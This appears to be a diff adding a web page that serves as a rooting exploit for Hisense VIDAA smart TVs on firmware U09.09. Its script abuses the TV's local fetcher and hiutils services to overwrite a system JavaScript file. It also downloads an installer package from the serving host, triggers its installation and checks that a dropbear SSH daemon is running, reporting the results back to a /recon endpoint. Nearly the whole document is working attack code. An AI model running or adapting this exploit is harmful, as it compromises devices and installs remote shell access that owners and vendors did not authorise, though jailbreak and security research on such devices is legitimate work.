@@ -1,0 +1,107 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>vidaa root installer (U09.09 / 09.09O)</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">START u909</pre>
+<script>
+/* Same as install.html, but superwatch command ids for the U09.09 branch:
+   uninstall 54, install 53 (82/83 reply 604 on 09.09O — see 55A7KAU findings/02). */
+var O = document.getElementById('o');
+function log(m){ O.textContent += "\n" + m; return m; }
+var BASE = "http://" + location.host + "/pub/";
+var FN_CANDIDATES = [
+  "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js",
+  "/APPS/pkgs/tv.vidaa.jsservice.system/current/functions/fetch/sw2.js",
+  "/APPS/pkgs/tv.vidaa.jsservice.system/CHA/functions/fetch/sw2.js"
+];
+var TRIGGER_URLS = [
+  "https://localhost:9888/function/basic/fetch/sw2",
+  "https://localhost:9888/function/system/fetch/sw2"
+];
+var SW_LIST = ["90:54:90;re.installer", "91:53:91;/APPS/installer.ipk;re.installer;"];
+
+function post(t){ try{ var x=new XMLHttpRequest(); x.open("POST","/recon",false);
+  x.setRequestHeader("Content-Type","text/plain"); x.send(t); }catch(e){} }
+
+function startFetcher(){
+  return new Promise(function(resolve){
+    try{
+      var ws = new WebSocket("wss://localhost:9888");
+      ws.onopen = function(){
+        ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher", method:"start",
+                                parameters:{}, session:901, timeout:10}));
+        setTimeout(function(){ try{ ws.close(); }catch(e){} resolve("fetcher start sent"); }, 1200);
+      };
+      ws.onerror = function(){ resolve("fetcher start: ws error"); };
+      setTimeout(function(){ resolve("fetcher start: timeout"); }, 5000);
+    }catch(e){ resolve("fetcher start EXC " + e.message); }
+  });
+}
+
+function writeFile(name, target, mode){
+  return new Promise(function(resolve){
+    var args = JSON.stringify({url: BASE + name, directory: target, permission: mode || 420});
+    try{
+      var r = vowOS.service.syncExecute("basic/fetcher", {api:"fetchFile", args: args});
+      resolve(name + " -> " + JSON.stringify(r.ret) + " " + JSON.stringify(r.msg).slice(0,80));
+    }catch(e){ resolve(name + " EXC " + e.message); }
+  });
+}
+
+function trigger(){
+  return new Promise(function(resolve){
+    var results = [];
+    for (var i = 0; i < TRIGGER_URLS.length; i++){
+      try{
+        var x = new XMLHttpRequest();
+        x.open("POST", TRIGGER_URLS[i], false);
+        x.setRequestHeader("identifier", "");
+        x.send(JSON.stringify({list: SW_LIST}));
+        results.push(TRIGGER_URLS[i].replace("https://localhost:9888","") + " -> " + String(x.responseText||"").slice(0,400));
+        if (String(x.responseText||"").indexOf("got error") === -1 && String(x.responseText||"").length > 0) break;
+      }catch(e){ results.push(TRIGGER_URLS[i].replace("https://localhost:9888","") + " EXC " + e.name + ": " + e.message); }
+    }
+    resolve("trigger (53/54) -> " + results.join(" | "));
+  });
+}
+
+function readInstallerLog(){
+  var tries = [
+    {mode:6, path:".re_sshd/installer_log.txt"},
+    {mode:6, path:["../.re_sshd/installer_log.txt"]},
+    {mode:6, path:"/APPS/.re_sshd/installer_log.txt"}
+  ];
+  for (var i = 0; i < tries.length; i++) {
+    try {
+      var p = vowOS.service.syncExecute("hiutils", {api:"fileRead", args: tries[i]});
+      if (p.ret) return "log=" + String(p.msg).slice(0,1200);
+    } catch(e) {}
+  }
+  return "log=ERR (postinst did not create /APPS/.re_sshd/installer_log.txt)";
+}
+
+setTimeout(async function(){
+  var out = [];
+  out.push(await startFetcher());
+  var sw2ok = false;
+  for (var i = 0; i < FN_CANDIDATES.length && !sw2ok; i++) {
+    var r = await writeFile("sw2.js", FN_CANDIDATES[i], 420);
+    out.push(r + "  [" + FN_CANDIDATES[i] + "]");
+    sw2ok = r.indexOf("true") !== -1;
+  }
+  var ipk = await writeFile("installer.ipk", "/APPS/installer.ipk", 420);
+  out.push(ipk);
+  var ipkok = ipk.indexOf("true") !== -1;
+  if (sw2ok && ipkok) {
+    out.push(await trigger());
+  } else {
+    out.push("trigger SKIPPED (need both sw2.js and installer.ipk; sw2=" +
+      sw2ok + " ipk=" + ipkok + ")");
+  }
+  await new Promise(function(res){ setTimeout(res, 6000); });
+  out.push(readInstallerLog());
+  try {
+    var pid = vowOS.service.syncExecute("hiutils", {api:"fileRead", args:{mode:6, path:".re_sshd/dropbear.pid"}});
+    out.push("dropbear.pid=" + (pid.ret ? String(pid.msg).trim() : "ERR"));
+  } catch(e) { out.push("dropbear.pid EXC " + e.message); }
+  post("INSTALL-U909\n" + out.join("\n"));
+  log(out.join("\n"));
+}, 1000);
+</script></body></html>
